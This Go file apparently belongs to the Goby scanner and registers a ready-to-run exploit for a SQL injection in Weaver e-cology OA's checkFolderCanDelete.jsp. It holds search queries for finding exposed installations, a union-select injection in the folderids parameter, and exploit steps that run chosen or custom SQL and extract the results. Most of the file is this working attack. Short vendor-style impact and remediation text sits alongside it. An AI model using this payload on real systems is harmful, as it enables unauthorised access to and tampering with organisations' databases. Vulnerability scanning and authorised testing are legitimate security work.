package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology /docs/networkdisk/checkFolderCanDelete.jsp SQL Injection Vulnerability",
    "Description": "<p>The Weaver e-cology OA system has a SQL injection vulnerability that allows attackers to construct malicious SQL statements to access sensitive information in the database without authorization, and even modify or delete the database, leading to data leakage and damage to system integrity.</p>",
    "Product": "Weaver-OA(E-COLOGY)",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-12-26",
    "PostTime": "2024-12-26",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/js/ecology8\" || body=\"wui/common/css/w7OVFont_wev8.css\" || (body=\"weaver\" && body=\"ecology\") || (header=\"ecology_JSessionId\" && body=\"login/Login.jsp\") || body=\"/wui/index.html\" || body=\"jquery_wev8\" && body=\"/login/Login.jsp?logintype=1\"",
    "GobyQuery": "body=\"/js/ecology8\" || body=\"wui/common/css/w7OVFont_wev8.css\" || (body=\"weaver\" && body=\"ecology\") || (header=\"ecology_JSessionId\" && body=\"login/Login.jsp\") || body=\"/wui/index.html\" || body=\"jquery_wev8\" && body=\"/login/Login.jsp?logintype=1\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to access or tamper with sensitive data in the database through SQL injection, which may lead to data leakage, system crashes, and business interruptions, among other serious consequences.</p>",
    "Recommendation": "<p>It is recommended to immediately upgrade the Weaver e-cology OA system to the latest version and strictly validate all input parameters to prevent SQL injection attacks. Additionally, it is recommended to use security measures such as WAF (Web Application Firewall) to filter malicious requests.</p>",
    "References": [
        "https://github.com/hi-unc1e/afrog/blob/7725b4cb6562db7f3a6a8a7a8923d8891cf43d3c/pocs/afrog-pocs/vulnerability/yaml-poc-weaver-weaver_e_cology_oa-unauthorized_access-CNNVD-201910-1226.yml#L4"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "DB_NAME(),@@VERSION,SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/docs/networkdisk/checkFolderCanDelete.jsp?folderids=-1))union(select({{{numtotle}}}),db_name()+where(0=0",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{num3}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/docs/networkdisk/checkFolderCanDelete.jsp?folderids=-1))union(select(11111*11111),{{{payload}}}+where(0=0",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\":\"([^'][\\s\\S]*?)\"}]",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        "CNNVD-201910-1226"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "泛微e-cology /docs/networkdisk/checkFolderCanDelete.jsp SQL 注入漏洞",
            "Product": "泛微-OA（e-cology）",
            "Description": "<p>泛微e-cology OA系统存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，未经授权地访问数据库中的敏感信息，甚至可能对数据库进行修改或删除操作，导致数据泄露和系统完整性受损。</p>",
            "Recommendation": "<p>建议立即升级泛微e-cology OA系统至最新版本，并对所有输入参数进行严格的校验，防止SQL注入攻击。同时，建议使用WAF（Web应用防火墙）等安全措施，过滤恶意请求。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入方式访问或篡改数据库中的敏感数据，可能导致数据泄露、系统崩溃以及业务中断等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology /docs/networkdisk/checkFolderCanDelete.jsp SQL Injection Vulnerability",
            "Product": "Weaver-OA(E-COLOGY)",
            "Description": "<p>The Weaver e-cology OA system has a SQL injection vulnerability that allows attackers to construct malicious SQL statements to access sensitive information in the database without authorization, and even modify or delete the database, leading to data leakage and damage to system integrity.</p>",
            "Recommendation": "<p>It is recommended to immediately upgrade the Weaver e-cology OA system to the latest version and strictly validate all input parameters to prevent SQL injection attacks. Additionally, it is recommended to use security measures such as WAF (Web Application Firewall) to filter malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to access or tamper with sensitive data in the database through SQL injection, which may lead to data leakage, system crashes, and business interruptions, among other serious consequences.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}",
        "num1": "define|variable|{{{rand|int|7}}}",
        "num2": "define|variable|{{{rand|int|7}}}",
        "numtotle": "define|variable|-{{{num1}}}-{{{num2}}}",
        "num3": "num2|add|{{{num1}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode",
        "num1",
        "num2",
        "numtotle",
        "num3"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
